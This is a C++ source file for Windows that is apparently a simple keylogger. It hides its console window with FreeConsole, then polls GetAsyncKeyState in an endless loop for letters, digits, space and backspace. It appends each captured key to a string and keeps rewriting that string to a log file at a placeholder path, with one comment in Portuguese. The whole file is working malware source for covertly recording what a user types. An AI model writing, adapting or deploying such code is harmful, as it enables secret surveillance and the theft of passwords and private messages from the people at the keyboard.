#include <windows.h>
#include <iostream>        
#include <fstream>         
#include <string>

using namespace std;

int main(){
    FreeConsole();

    string keys;

    while(1){
        if(GetAsyncKeyState(0x41)){      
            cout << "A";                
            keys+= "A";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x42)){      
            cout << "B";                
            keys+= "B";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x43)){      
            cout << "C";                
            keys+= "C";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x44)){      
            cout << "D";                
            keys+= "D";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x45)){      
            cout << "E";                
            keys+= "E";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x46)){      
            cout << "F";                
            keys+= "F";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x47)){      
            cout << "G";                
            keys+= "G";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x48)){      
            cout << "H";                
            keys+= "H";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x49)){      
            cout << "I";                
            keys+= "I";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x4A)){      
            cout << "J";                
            keys+= "J";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x4B)){      
            cout << "K";                
            keys+= "K";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x4C)){      
            cout << "L";                
            keys+= "L";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x4D)){      
            cout << "M";                
            keys+= "M";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x4E)){      
            cout << "N";                
            keys+= "N";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x4F)){      
            cout << "O";                
            keys+= "O";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x50)){      
            cout << "P";                
            keys+= "P";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x51)){      
            cout << "Q";                
            keys+= "Q";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x52)){      
            cout << "R";                
            keys+= "R";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x53)){      
            cout << "S";                
            keys+= "S";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x54)){      
            cout << "T";                
            keys+= "T";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x55)){      
            cout << "U";                
            keys+= "U";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x56)){      
            cout << "V";                
            keys+= "V";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x57)){      
            cout << "W";                
            keys+= "W";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x58)){      
            cout << "X";                
            keys+= "X";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x59)){      
            cout << "Y";                
            keys+= "Y";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x08)){      
            cout << "[BACKSPACE]";                
            keys+= "[BACKSPACE]";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x20)){      
            cout << "[SPACE]";                
            keys+= "[SPACE]";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x30)){      
            cout << "0";                
            keys+= "0";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x31)){      
            cout << "1";                
            keys+= "1";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x32)){      
            cout << "2";                
            keys+= "2";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x33)){      
            cout << "3";                
            keys+= "3";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x34)){      
            cout << "4";                
            keys+= "4";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x35)){      
            cout << "5";                
            keys+= "5";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x36)){      
            cout << "6";                
            keys+= "6";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x37)){      
            cout << "7";                
            keys+= "7";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x38)){      
            cout << "8";                
            keys+= "8";    
            Sleep(150);
        }

        if(GetAsyncKeyState(0x39)){      
            cout << "9";                
            keys+= "9";    
            Sleep(150);
        }   
        ofstream myfile;
        //nao precisa criar o log, ele vai ser criado automaticamente
        myfile.open ("C:\\caminho\\da\\sua\\escolha\\log.txt");
        myfile << keys;
        myfile.close();
    }
    
    return 0;   
}

